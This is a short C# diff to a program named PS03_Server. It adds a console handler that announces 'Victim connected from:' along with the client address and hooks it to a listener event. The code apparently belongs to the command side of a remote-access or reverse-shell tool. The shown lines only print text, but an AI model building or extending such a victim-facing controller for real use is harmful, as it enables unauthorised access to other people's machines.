@@ -50,11 +50,20 @@ namespace PS03_Server
 
         }
 
+        private static void ClientConnected(string client)
+        {
+            string data = "Victim connected from: " + client;
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.SetCursorPosition((Console.WindowWidth - data.Length) / 2, Console.CursorTop);
+            Console.WriteLine(data);
+        }
+
 
 
         private static void Go()
         {
             var listener = new Listener();
+            listener.OnVictimConnected += ClientConnected;
             listener.OnOutputReady += ReceivedData;
             listener.start();
         }
